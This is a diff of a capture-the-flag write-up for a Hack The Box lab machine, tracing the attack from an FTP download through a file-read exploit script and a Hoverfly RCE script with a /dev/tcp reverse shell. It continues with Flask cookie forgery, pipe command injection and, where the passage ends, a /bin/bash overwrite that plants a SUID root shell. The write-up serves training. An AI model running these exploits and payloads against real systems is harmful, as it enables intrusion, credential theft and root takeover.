@@ -40,7 +40,7 @@ tags:
 Will Use Nmap To See what Ports and Services are Open:
 
 ```bash
-nmap -A -sS -P -T4  --min-rate 5000 10.129.14.43
+nmap -A -sS -P -T4 --min-rate 5000 10.129.14.43
 ```
 
 ```text
@@ -78,8 +78,95 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: Jetty(9.4.27.v20200227)
 |_http-title: Error 404 Not Found
 8500/tcp open  fmtp?
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 29 Mar 2026 13:52:40 GMT
+|     Content-Length: 64
+|     This is a proxy server. Does not respond to non-proxy requests.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 29 Mar 2026 13:52:08 GMT
+|     Content-Length: 64
+|     This is a proxy server. Does not respond to non-proxy requests.
+|   HTTPOptions:
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 29 Mar 2026 13:52:09 GMT
+|     Content-Length: 64
+|_    This is a proxy server. Does not respond to non-proxy requests.
 8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
 |_http-title: Hoverfly Dashboard
+
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8500-TCP:V=7.94SVN%I=7%D=3/29%Time=69C92E9C%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\
+SF:x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-
+SF:Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2029\x20Mar\x202026\x2013:52
+SF::08\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20
+SF:server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")
+SF:%r(HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nC
+SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:
+SF:\x20nosniff\r\nDate:\x20Sun,\x2029\x20Mar\x202026\x2013:52:09\x20GMT\r\
+SF:nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20D
+SF:oes\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPReques
+SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
+SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
+SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
+SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
+SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
+SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
+SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
+SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Serve
+SF:r\x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Conten
+SF:t-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2029\x20Mar\x202026\x2013:
+SF:52:40\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x
+SF:20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n
+SF:");
+
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=21%CT=1%CU=32999%PV=Y%DS=2%DC=T%G=Y%TM=69C9
+OS:2F13%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP
+OS:=FD%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=108%TI=Z%CI=Z%
+OS:II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR=108
+OS:%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O
+OS:4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=
+OS:FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=
+OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A
+OS:%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
+OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
+OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
+OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   252.93 ms 10.10.14.1
+2   237.86 ms 10.129.14.43
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 133.58 seconds
 ```
 
 - 🔍 *FTP has anonymous login enabled. Let's inspect the files on the FTP server:*
@@ -98,7 +185,7 @@ Using binary mode to transfer files.
 ```
 
 ```bash
-ftp> ls
+ls
 ```
 
 ```text
@@ -109,7 +196,7 @@ drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
 ```
 
 ```bash
-ftp> cd pub
+cd pub
 ```
 
 ```text
@@ -117,7 +204,7 @@ ftp> cd pub
 ```
 
 ```bash
-ftp> ls
+ls
 ```
 
 ```text
@@ -128,7 +215,7 @@ ftp> ls
 ```
 
 ```bash
-ftp> get employee-service.jar
+get employee-service.jar
 ```
 
 ```text
@@ -141,7 +228,7 @@ local: employee-service.jar remote: employee-service.jar
 ```
 
 ```bash
-ftp> quit
+quit
 ```
 
 ```text
@@ -167,19 +254,11 @@ Archive:  employee-service.jar
 ```
 
 ```bash
-cd htb
+cd target_directory/
 ```
 
 ```bash
-ls
-```
-
-```text
-devarea
-```
-
-```bash
-cd devarea
+cd htb/devarea
 ```
 
 ```bash
@@ -191,7 +270,7 @@ EmployeeService.class      Report.class
 EmployeeServiceImpl.class  ServerStarter.class
 ```
 
-- 🔍 *So there are these employeeservice java files, that need to be compiled in order to see the content*
+- 🔍 *We compile (decompile) the Java class files using `javap` to inspect the bytecode:*
 
 ```bash
 javap -c -p EmployeeServiceImpl.class
@@ -413,11 +492,11 @@ public class htb.devarea.ServerStarter {
 }
 ```
 
-- 🔍 *Breakdown --->*
+- 🔍 **Breakdown:**
   - **EmployeeService.class:** The Interface. It defines the "contract" (the names of the methods) but contains no actual code logic.
-  - **EmployeeServiceImpl.class:** The Logic. This is the most important file; it contains the `submitReport` method that processes your input and returns the string (leads to LFI/XXE).
+  - **EmployeeServiceImpl.class:** The Logic. This is the most important file; it contains the `submitReport` method that processes your input and returns the string. (leads to LFI/XXE)
   - **Report.class:** The Data Model. This defines what a "Report" object looks like (fields for `employeeName`, `department`, `content`, and the `isConfidential` flag).
-  - **ServerStarter.class:** The Entry Point. This starts the web server, sets the port (8080), and maps the EmployeeService to the `/employeeservice` URL.
+  - **ServerStarter.class:** The Entry Point. This starts the web server, sets the port (8080), and maps the EmployeeService to the `/employeeservice` URL you found in the WSDL.
 
 ---
 
@@ -509,7 +588,7 @@ Connection: close
 </soapenv:Envelope>
 ```
 
-- 🔍 *The server throws a DTD parser error:*
+- 🔍 *Send this via burpsuite and get response:*
 
 ```http
 HTTP/1.1 500 Server Error
@@ -530,24 +609,26 @@ Server: Jetty(9.4.27.v20200227)
 ```
 
 > [!NOTE]
-> **Exploitation Barrier (DTD Blocked):**
-> Jetty/CXF explicitly blocks the DOCTYPE declaration. Seeing a DTD element violates the parser configuration, resulting in a parser crash.
-
-- 🔍 *However, the underlying Apache CXF framework is vulnerable to unauthenticated LFI via XOP Include (CVE-2022-46364).*
+> **Why simple XXE failed:**
+> The error we received ("Received event DTD, instead of START_ELEMENT") explains exactly why the first attempt failed.
+> - **The Guardrail:** Modern XML parsers (like the one in your Jetty/CXF server) are often configured with a security setting that completely disables DTD (Document Type Definition) processing.
+> - **The Result:** When you sent `<!DOCTYPE ...>`, the parser saw it as a violation of its security policy and killed the request before even looking at your payload. It didn't "block" the file read; it blocked the syntax used to define the entity.
 
 > [!IMPORTANT]
-> **Apache CXF XOP Include LFI (CVE-2022-46364):**
-> The script exploits a specific flaw in Apache CXF. When the server receives an `xop:Include` tag, the CXF framework automatically resolves the `href` attribute. It fetches the file (`file:///etc/passwd`) before the Java code even validates the XML structure.
-> Since `/etc/passwd` contains characters that could break XML layout, Apache CXF automatically Base64 encodes the file contents. The `EmployeeServiceImpl.class` logic takes this resolved element (`employeeName`) and mirrors it back in the response string: `"Report received from [EmployeeName]"`. We can extract and decode the Base64 value to retrieve files.
+> **Why this worked (CVE-2022-46364):**
+> The script exploits a specific flaw in Apache CXF (the framework running your SOAP service).
+> - **The "Double Fetch":** When the server receives an `xop:Include` tag, the CXF framework automatically resolves the `href`. It fetches the file (`/etc/passwd`) before the Java code even sees it.
+> - **Automatic Base64:** Because `/etc/passwd` contains characters that could break XML (like `:` or newlines), Apache CXF automatically Base64 encodes the file content to keep the XML "legal."
+> - **The "Mirror" Effect:** Your `EmployeeServiceImpl.class` logic takes the `employeeName` and returns it in the response: `"Report received from [EmployeeName]"`. Since the framework replaced your tag with the Base64-encoded file, the server literally hands you the encoded file in its "Hello" message.
 
-- 🔍 *Created a bash script (`lfi.sh`) to automate this XOP Include file read:*
+- 🔍 *We create an exploit script (`exploit.sh`) that will get the `/etc/passwd` info:*
 
 ```bash
 #!/bin/bash
 
 # ===========================
 # CVE-2022-46364 - Apache CXF XOP Include LFI
-# Usage: bash lfi.sh file:///etc/passwd
+# Usage: bash exploit.sh file:///etc/passwd
 # ===========================
 
 TARGET="http://devarea.htb:8080/employeeservice"
@@ -589,10 +670,10 @@ echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
 
 ## Step 3 - Initial Foothold
 
-- 🔍 *Executing the LFI script to read `/etc/passwd`:*
+- 🔍 *Executing the exploit script to read `/etc/passwd`:*
 
 ```bash
-./lfi.sh file:///etc/passwd
+./exploit.sh file:///etc/passwd
 ```
 
 ```text
@@ -638,11 +719,10 @@ _laurel:x:999:987::/var/log/laurel:/bin/false
 dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
 ```
 
-- 🔍 *We identify the local user: `dev_ryan`.*
-- 🔍 *We check the Hoverfly service environment using our LFI:*
+- 🔍 *We have a user `dev_ryan`! Now as we know that there is this hoverfly running on port 8888, it's a dashboard, which needs login creds, and now that we can read the file system, there might be a way in to read the configuration file for this, it might be running somewhere in the background as some service file:*
 
 ```bash
-./lfi.sh file:///etc/systemd/system/hoverfly.service
+./exploit.sh file:///etc/systemd/system/hoverfly.service
 ```
 
 ```text
@@ -670,22 +750,31 @@ StandardError=journal
 WantedBy=multi-user.target
 ```
 
-- 🔍 *We extract Hoverfly admin credentials:* `admin:O7IJ27MyyXiU`.
-- 🔍 *The Hoverfly instance version v1.11.3 contains an authenticated RCE vulnerability (CVE-2025-54123).*
+- 🔍 *Just like said above, it gave us the exact credentials for entry: `admin:O7IJ27MyyXiU`. Now let's use these creds in the web dashboard at 8888. Logged in, and got a very interesting thing, the version is `v1.11.3`.*
+- 🔍 *While searching for known vulnerabilities in this version:*
 
 > [!NOTE]
-> **Vulnerability Details (Hoverfly Middleware RCE - CVE-2025-54123):**
-> Hoverfly version 1.11.3 and prior allows authenticated administrators to upload custom processing scripts via `/api/v2/hoverfly/middleware`.
-> - **Cause:** Insufficient validation of user input in the `binary` and `script` parameters.
-> - **Impact:** By defining `/bin/bash` as the binary and a reverse shell script as the middleware payload, code execution is achieved.
-> - **Proxy Requirement:** Hoverfly only executes middleware when proxying network requests. Therefore, after uploading the payload to Port 8888 (admin), we must send a request through Port 8500 (proxy) to trigger the script.
+> **Hoverfly Middleware Remote Code Execution (RCE) - CVE-2025-54123:**
+> Hoverfly version 1.11.3 and prior are affected by a critical Remote Code Execution (RCE) vulnerability, identified as CVE-2025-54123.
+> - **Vulnerability Details:** The flaw exists in the middleware management API endpoint, specifically at `/api/v2/hoverfly/middleware`.
+> - **Cause:** Insufficient validation and sanitization of user input in the `binary` and `script` parameters.
+> - **Impact:** An unauthenticated attacker can inject malicious payloads or execute arbitrary system commands (such as reverse shells) on the host server. These commands run with the same privileges as the Hoverfly process.
+> - **Technical Flaws:** The issue stems from a combination of insufficient input validation, unsafe command execution, and immediate execution during testing within the service's code.
 
-- 🔍 *Hoverfly runs on two ports:*
+- 🔍 *We got a RCE! Now I have tried it with some attempts but getting some failures, then I understood the flow with AI:*
+
+> [!WARNING]
+> **Why previous attempts failed:**
+> - **DTD/XXE Blocked:** Your first attempt failed because the XML parser (Jetty/CXF) had a security filter that killed any request containing a `<!DOCTYPE>` tag.
+> - **The "Unexpected Wrapper" (Namespace):** Your manual attempts often triggered 500 errors because of a missing trailing slash (`/`) in the namespace or missing fields in the `Report` object. Java/SOAP is extremely "picky"—if the XML doesn't match the `.class` file perfectly, it crashes.
+> - **No Trigger:** Even when you successfully updated the middleware manually, nothing happened. This is because Hoverfly only runs middleware when it processes a request. If nobody is using the proxy, your "attack" just sits in memory doing nothing.
+
+- 🔍 *I later on get to know that it runs 2 ports:*
   - **8888 (Admin Control):** This is where you change settings and upload scripts.
   - **8500 (The Proxy):** This is where the actual data flows.
-  - By sending a request to port 8500, we forced the server to process data, which triggered the "Middleware" we uploaded to port 8888.
+  - By sending a request to port 8500, we forced the server to process data, which triggered the "Middleware" we uploaded to port 8888. So it means to trigger the middleware we need to use the proxy.
 
-- 🔍 *Created an exploit script `exploit_hoverfly.py` to upload the payload and trigger execution:*
+- 🔍 *Let's make an automated python script `exploit_hoverfly.py` for this whole attack:*
 
 ```python
 import requests
@@ -733,23 +822,40 @@ def trigger_proxy():
         "http": f"http://{USER}:{PASS}@devarea.htb:8500",
     }
     try:
+        # We use a background-like trigger by setting a short timeout
         requests.get("http://devarea.htb/", proxies=proxies, timeout=2)
     except requests.exceptions.RequestException:
+        # Timeout is expected if the shell hangs the process
         pass
 
 def main():
     token = get_token()
     if not token:
         sys.exit(1)
-        
-    lhost = input("Enter LHOST: ")
-    lport = input("Enter LPORT [4444]: ") or "4444"
-    
+
+    # 1. TEST PHASE (whoami)
+    print("[*] Testing RCE with 'whoami'...")
+    # Using a simple script that creates a file in /tmp to verify execution
+    status, res = set_middleware(token, "whoami > /tmp/pwned")
+    if status == 200:
+        trigger_proxy()
+        print("[+] 'whoami' command sent. If the API returned 200, we are ready.")
+    else:
+        print(f"[-] Middleware setup failed: {res}")
+        sys.exit(1)
+
+    # 2. REVERSE SHELL PHASE
+    print("\n" + "="*40)
+    print("STEP: SETUP YOUR LISTENER (nc -lvnp 4444)")
+    print("="*40)
+    lhost = input("Enter your HTB VPN IP: ")
+    lport = input("Enter Port [4444]: ") or "4444"
+
     rev_shell_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-    
+
     print(f"[*] Setting Reverse Shell for {lhost}:{lport}...")
     status, res = set_middleware(token, rev_shell_script)
-    
+
     if status == 200:
         print("[+] Middleware updated. Triggering shell now...")
         trigger_proxy()
@@ -761,7 +867,15 @@ if __name__ == "__main__":
     main()
 ```
 
-- 🔍 *Starting the netcat listener on the attacker machine:*
+> [!NOTE]
+> **The Logic of the Script:**
+> The Python script automates the four critical stages of the attack:
+> 1. **Authentication (The Token):** It hits `/api/token-auth`. This is the modern way APIs handle logins. Instead of sending your password every time, you exchange it once for a JWT (JSON Web Token). The script grabs this token so it can "prove" it's admin for the next steps.
+> 2. **Weaponization (The Middleware):** Hoverfly has a feature called Middleware. It’s meant for developers to "tweak" API responses using scripts. We abused this by telling Hoverfly: "Hey, use `/bin/bash` as your tool and run my reverse shell as the script."
+> 3. **Execution (The Proxy Trigger):** This was the missing link. The script uses the requests proxy settings to send a fake request through the Hoverfly service (Port 8500). Hoverfly sees a request coming in. It says, "Wait, I have middleware I need to run first!" It executes `/bin/bash` with your shell payload.
+> 4. **The Shell:** Since Hoverfly is running as a service, the shell it "pops" inherits the permissions of the user running it (`dev_ryan`).
+
+- 🔍 *On listener:*
 
 ```bash
 nc -lvnp 4444
@@ -775,7 +889,7 @@ bash: no job control in this shell
 dev_ryan@devarea:/opt/HoverFly$
 ```
 
-- 🔍 *Interacting with the reverse shell and reading the user flag:*
+- 🔍 *Interactive Reverse Shell session:*
 
 ```bash
 cat /home/ryan_dev/user.txt
@@ -832,41 +946,85 @@ cat user.txt
 
 ## Step 4 - Privilege Escalation
 
-- 🔍 *Checking sudo privileges:*
+- 🔍 *So let's see what this user got for us. Checking sudo privileges:*
 
 ```bash
 sudo -l
 ```
 
 ```text
+Matching Defaults entries for dev_ryan on devarea:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
 User dev_ryan may run the following commands on devarea:
     (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
 ```
 
-- 🔍 *Enumerating active local network listeners:*
+- 🔍 *No access to the directory. Checking script help:*
+
+```bash
+sudo /opt/syswatch/syswatch.sh --help
+```
+
+```text
+SysWatch 1.0.0
+Usage: /opt/syswatch/syswatch.sh <command> [args]
+
+Commands:
+  web                 Start web GUI
+  web-stop            Stop web GUI
+  web-restart         Restart web GUI
+  web-status          Show web GUI status
+  plugin <name> [args] Execute plugin
+  plugins             List available plugins
+  logs <file>         View log file
+  logs --list         List available log files
+  --version           Show version
+  --help|-h|help      Show this help
+```
+
+```bash
+sudo /opt/syswatch/syswatch.sh web-status
+```
+
+```text
+● syswatch-web.service - SysWatch Web GUI
+     Loaded: loaded (/etc/systemd/system/syswatch-web.service; enabled; preset: enabled)
+     Active: active (running) since Mon 2026-03-30 14:06:38 UTC; 23h ago
+   Main PID: 1472 (python)
+      Tasks: 1 (limit: 4546)
+     Memory: 25.8M (peak: 26.0M)
+        CPU: 22.388s
+     CGroup: /system.slice/syswatch-web.service
+             └─1472 /opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py
+```
+
+- 🔍 *Some sort of web service, but running where? Checking local network listeners:*
 
 ```bash
 ss -tnlp
 ```
 
 ```text
-State  Recv-Q Send-Q  Local Address:Port  Peer Address:Port Process
-LISTEN 0      4096          0.0.0.0:22         0.0.0.0:*
-LISTEN 0      511           0.0.0.0:80         0.0.0.0:*
-LISTEN 0      4096    127.0.0.53%lo:53         0.0.0.0:*
-LISTEN 0      128         127.0.0.1:7777       0.0.0.0:*
-LISTEN 0      4096       127.0.0.54:53         0.0.0.0:*
-LISTEN 0      100         127.0.0.1:25         0.0.0.0:*
-LISTEN 0      32               [::]:21            [::]:*
-LISTEN 0      4096             [::]:22            [::]:*
-LISTEN 0      4096                *:8500             *:*     users:(("hoverfly",pid=1460,fd=5))
-LISTEN 0      4096                *:8888             *:*     users:(("hoverfly",pid=1460,fd=6))
+State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+LISTEN 0      4096          0.0.0.0:22         0.0.0.0:*      # SSH
+LISTEN 0      511           0.0.0.0:80         0.0.0.0:*      # web devarea
+LISTEN 0      4096    127.0.0.53%lo:53         0.0.0.0:*      # DNS
+LISTEN 0      128         127.0.0.1:7777       0.0.0.0:*      # Custom Probably for syswatch
+LISTEN 0      4096       127.0.0.54:53         0.0.0.0:*      # DNS
+LISTEN 0      100         127.0.0.1:25         0.0.0.0:*      # SMTP
+LISTEN 0      32               [::]:21            [::]:*      # FTP
+LISTEN 0      4096             [::]:22            [::]:*      # SSH for IPV6
+LISTEN 0      4096                *:8500             *:*      users:(("hoverfly",pid=1460,fd=5))
+LISTEN 0      4096                *:8888             *:*      users:(("hoverfly",pid=1460,fd=6))
 LISTEN 0      100             [::1]:25            [::]:*
-LISTEN 0      50                  *:8080             *:*     users:(("java",pid=1459,fd=26))
+LISTEN 0      50                  *:8080             *:*      users:(("java",pid=1459,fd=26))
 ```
 
-- 🔍 *We see an internal service listening locally on port 7777.*
-- 🔍 *Checking environmental configuration files for the service:*
+- 🔍 *We see an internal service listening locally on port 7777. Let's tunnel up! Chisel can be used to tunnel up here. Once done, go to browser -> `http://127.0.0.1:7777/login`.*
+- 🔍 *It turns out to be a login page, and no found credentials worked. While looking at some confs and other files in `/etc`:*
 
 ```bash
 cat /etc/syswatch.env
@@ -875,19 +1033,31 @@ cat /etc/syswatch.env
 ```text
 SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
 SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
+SYSWATCH_LOG_DIR=/opt/syswatch/logs
+SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
+SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
+SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
+SYSWATCH_VERSION=1.0.0
 ```
 
-- 🔍 *The local portal is a Flask application. We can decode and forge session cookies using the exposed `SYSWATCH_SECRET_KEY`:*
+- 🔍 *Okay we got a password and a secret key! Tried to login with the password and username admin, and didn't work. Now here is another way, we can forge a session id with this secret key for user admin! We will be using flask to forge the session id:*
+
+> [!NOTE]
+> **What is Flask?**
+> Flask is a lightweight Python web framework. It handles routing, requests, and user sessions. Flask is nothing but a python framework which can let us decode and forge cookies based on the structure provided.
+> Install it with: `pip3 install flask-unsign`
+
+- 🔍 *First we need to get a sample cookie from that web, in order to forge a new session with allowed structure. Once you got the session id from the web, just decode it:*
 
 ```bash
 flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acqVqw.rZ8yUEf9Da2nsafgfRjz4c5lJNQ'
 ```
 
-```json
-{"user_id": 1, "username": "admin"}
+```text
+{'user_id': 1, 'username': 'admin'}
 ```
 
-- 🔍 *Forging the administrator cookie:*
+- 🔍 *Now let's forge the cookie/session id:*
 
 ```bash
 flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin'}" --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
@@ -897,8 +1067,33 @@ flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin'}" --secret 'f3a
 eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
 ```
 
-- 🔍 *We tunnel Port 7777 to our host. Setting this forged cookie in our browser grants administrative access to the SysWatch dashboard.*
-- 🔍 *We capture the POST request to `/service-status` and test for command injection via command chaining:*
+- 🔍 *We got the cookie for admin, just paste it in browser and we are in! While looking at the service, it seems like bunch of logs are there, and details about service.*
+- 🔍 *When I captured the POST request for this `/service-status` endpoint (which basically has an input field that lets us know the status of services like ssh, ftp, etc.):*
+
+```http
+POST /service-status HTTP/1.1
+Host: 127.0.0.1:7777
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Origin: http://127.0.0.1:7777
+Connection: close
+Referer: http://127.0.0.1:7777/service-status
+Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+service=ssh
+```
+
+- 🔍 *This service parameter looks kinda fishy, because if we look closely, the backend might be running `systemctl status {input}`. Let's try to use pipe operator to execute any system command:*
 
 ```http
 POST /service-status HTTP/1.1
@@ -923,8 +1118,20 @@ Priority: u=0, i
 service=ssh|whoami
 ```
 
-- 🔍 *The backend executes `systemctl status ssh | whoami` and mirrors the output. It returns `syswatch` (the service user).*
-- 🔍 *Outbound network calls are blocked for the `syswatch` user. We inspect local file permissions on system binaries:*
+- 🔍 *It worked, I got `syswatch` in the output.*
+
+> [!NOTE]
+> **Pipe's Significance:**
+> ```
+> systemctl status ssh | whoami
+> ```
+> Here `whoami` doesn't read stdin at all. It just runs and prints user info regardless. So the pipe here is being abused purely as a **command chaining operator**:
+> - `systemctl status ssh` -> outputs service status text
+> - `|` -> pipe created (but whoami ignores it)
+> - `whoami` -> runs independently, prints current user
+
+- 🔍 *The pipe was created and ignored or we can say bypassed, and the whoami command ran independently. We got everything we needed, Remote code execution directly on the server! Tried using reverse shell payload, didn't work, with single as well as double URL encode, the server side firewall might have something that is blocking it. It runs `systemctl status {service_name_from_input}` and whenever I try to use some built-in utilities like `cat`, `head`, `more` etc. to read the content it just gives me an error of "Invalid service name", while when I run only the command name like `systemctl status cat` it gives me the details of `cat` flags and usage! which is strange. Means we almost have this vulnerability of RCE but we just unable to get success. Let's try something else.*
+- 🔍 *While enumerating I found one critical thing:*
 
 ```bash
 ls -la /bin/bash
@@ -934,7 +1141,7 @@ ls -la /bin/bash
 -rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
 ```
 
-- 🔍 *The primary system shell `/bin/bash` is world-writable:*
+- 🔍 *The bin bash is writable!*
 
 ```text
 -rwxrwxrwx
@@ -945,12 +1152,23 @@ ls -la /bin/bash
  └└└─────── owner:   r=read w=write x=execute
 ```
 
-> [!IMPORTANT]
-> **World-Writable Bash Shell Exploitation Strategy:**
-> Since `/opt/syswatch/syswatch.sh` runs as root via `sudo`, it starts with `#!/bin/bash`. If we modify the `/bin/bash` binary, the root script will run our hijacked bash payload, granting immediate root code execution.
-> Overwriting `/bin/bash` directly yields a `Text file busy` (ETXTBSY) lock because it is our active shell. We bypass this by dropping into `dash`, terminating active bash instances, and swapping the binary using `dd`.
+> [!WARNING]
+> **Why is This Catastrophic?**
+> `/bin/bash` is the most executed binary on the system. Everything uses it:
+> - cron jobs -> `#!/bin/bash`
+> - sudo commands -> calls bash internally
+> - shell scripts -> `#!/bin/bash`
+> - system services -> use bash for execution
+> 
+> **If you control what `/bin/bash` does, you control everything that runs bash.**
 
-- 🔍 *Creating a copy of the real bash binary:*
+- 🔍 *In our case, we can run `syswatch.sh` as root. As we saw above: `(root) NOPASSWD: /opt/syswatch/syswatch.sh`. Means that the script starts with `#!/bin/bash` which I can control! Attack chain:*
+  - `sudo syswatch.sh` -> runs as ROOT
+  - calls `/bin/bash` -> which YOU control
+  - your evil bash runs -> as ROOT (will copy our `evil_bash` into the main `/bin/bash`)
+  - profit
+
+- 🔍 *We are about to copy the real bash with our fake bash, so we first need to take the backup of the real bash, in order to work further:*
 
 ```bash
 cp /bin/bash /tmp/bash.bak
@@ -968,29 +1186,57 @@ ls
 bash.bak
 ```
 
-- 🔍 *Writing our SUID-creator wrapper script as `/tmp/evil_bash`:*
+- 🔍 *Now we have to create a fake bash to be replaced with the real bash:*
 
 ```bash
 cat << 'EOF' > evil_bash
-#!/tmp/bash.bak
-cp /tmp/bash.bak /tmp/rootbash
-chmod 4755 /tmp/rootbash
-exec /tmp/bash.bak "$@"
+#!/tmp/bash.bak                 # shebang — use REAL bash to run this script
+cp /tmp/bash.bak /tmp/rootbash  # copy real bash to /tmp/rootbash
+chmod 4755 /tmp/rootbash        # set SUID bit on rootbash (EVIL ACTION)
